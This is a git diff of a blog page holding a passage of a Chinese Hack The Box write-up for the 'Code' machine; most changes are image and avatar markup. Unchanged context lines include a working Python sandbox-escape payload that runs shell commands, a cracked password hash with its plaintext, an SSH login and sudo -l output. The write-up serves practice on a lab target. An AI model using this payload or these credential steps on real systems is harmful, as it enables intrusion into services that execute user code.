@@ -27,35 +27,13 @@
 <meta property="og:site_name" content="Sauy&#39;s corner">
 <meta property="og:description" content="HTB-codeusernmap扫描 nmap 10.10.11.62 -sV -A 发现开放了5000端口 访问发现是个在线执行python代码的网页 可以进行命令执行 print(&#39;&#39;.__class__.__base__.__subclasses__()[317](&#39;ls &#x2F;&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].st">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/image-20250424172649995.png">
-<meta property="og:image" content="http://example.com/images/image-20250424172727484.png">
-<meta property="og:image" content="http://example.com/images/image-20250424172954271.png">
-<meta property="og:image" content="http://example.com/images/image-20250704201740169.png">
-<meta property="og:image" content="http://example.com/images/image-20250704202033818.png">
-<meta property="og:image" content="http://example.com/images/image-20250704204016471.png">
-<meta property="og:image" content="http://example.com/images/image-20250704210450791.png">
-<meta property="og:image" content="http://example.com/images/image-20250704210623797.png">
-<meta property="og:image" content="http://example.com/images/image-20250705154651917.png">
-<meta property="og:image" content="http://example.com/images/image-20250705162041132.png">
-<meta property="og:image" content="http://example.com/images/image-20250705173217262.png">
-<meta property="og:image" content="http://example.com/images/image-20250705205553612.png">
-<meta property="og:image" content="http://example.com/images/image-20250705212059120.png">
-<meta property="og:image" content="http://example.com/images/image-20250706152119123.png">
-<meta property="og:image" content="http://example.com/images/image-20250706165006524.png">
-<meta property="og:image" content="http://example.com/images/image-20250706165042686.png">
-<meta property="og:image" content="http://example.com/images/image-20250706165110782.png">
-<meta property="og:image" content="http://example.com/images/image-20250706165152976.png">
-<meta property="og:image" content="http://example.com/images/image-20250706165252040.png">
-<meta property="og:image" content="http://example.com/images/image-20250706172603435.png">
-<meta property="og:image" content="http://example.com/images/image-20250706180434815.png">
-<meta property="og:image" content="http://example.com/images/image-20250706180903108.png">
-<meta property="og:image" content="http://example.com/images/image-20250706182729531.png">
+<meta property="og:image" content="http://example.com/images/sauy.jpg">
 <meta property="article:published_time" content="2025-07-06T09:20:58.000Z">
 <meta property="article:modified_time" content="2025-07-22T15:00:22.007Z">
 <meta property="article:author" content="Sauy">
 <meta property="article:tag" content="渗透学习">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/images/image-20250424172649995.png">
+<meta name="twitter:image" content="http://example.com/images/sauy.jpg">
   
   
   
@@ -71,7 +49,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Sauy","sameAs":[]},"dateCreated":"2025-07-06T17:20:58+08:00","dateModified":"2025-07-22T23:00:22+08:00","datePublished":"2025-07-06T17:20:58+08:00","description":"","headline":"HTB-wp","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/07/06/HTB-Practice/"},"publisher":{"@type":"Organization","name":"Sauy","sameAs":[]},"url":"http://example.com/2025/07/06/HTB-Practice/","keywords":"渗透学习","thumbnailUrl":"/images/11.JPG","image":1}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg"},"dateCreated":"2025-07-06T17:20:58+08:00","dateModified":"2025-07-22T23:00:22+08:00","datePublished":"2025-07-06T17:20:58+08:00","description":"","headline":"HTB-wp","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/07/06/HTB-Practice/"},"publisher":{"@type":"Organization","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg","logo":{"@type":"ImageObject","url":"/images/sauy.jpg"}},"url":"http://example.com/2025/07/06/HTB-Practice/","keywords":"渗透学习","thumbnailUrl":"/images/11.JPG","image":1}</script>
   
 </head>
 <body>
@@ -79,7 +57,7 @@
 <div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
 
 
-<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="undefined" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">Sauy's corner</div></a></div></header>
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/images/sauy.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">Sauy's corner</div><div class="sub cap">记录与分享</div></a></div></header>
 
 <div class="nav-area">
 
@@ -124,7 +102,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">317</span>](<span class="string">&#x27;ls *&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip())</span><br><span class="line"><span class="comment">#b&#x27;app.pyinstance:\ndatabase.db\n\n__pycache__:\napp.cpython-38.pyc\n\nstatic:\ncss\n\ntemplates:\nabout.html\ncodes.html\nindex.html\nlogin.html\nregister.html&#x27; </span></span><br><span class="line">发现有instance下有database.db 读一下试试看</span><br></pre></td></tr></table></figure>
 
 <p>于是可以拿到 martin的hash加密后的密码  <code>3de6f30c4a09c27fc71932bfc68474be</code> 就是 <code>nafeelswordsmaster</code></p>
-<p>然后使用ssh登录 ssh <a href="mailto:&#109;&#x61;&#114;&#x74;&#x69;&#x6e;&#64;&#x31;&#48;&#46;&#x31;&#48;&#46;&#x31;&#x31;&#46;&#54;&#x32;">martin@10.10.11.62</a> 提示输入密码 输入就好了</p>
+<p>然后使用ssh登录 ssh <a href="mailto:&#109;&#97;&#114;&#x74;&#105;&#110;&#64;&#x31;&#48;&#x2e;&#49;&#x30;&#x2e;&#49;&#49;&#46;&#x36;&#x32;">martin@10.10.11.62</a> 提示输入密码 输入就好了</p>
 <p>输入<code>sudo -l</code> 回显 </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">martin@code:~$ sudo -l</span><br><span class="line">Matching Defaults entries for martin on localhost:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User martin may run the following commands on localhost:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh</span><br></pre></td></tr></table></figure>
 
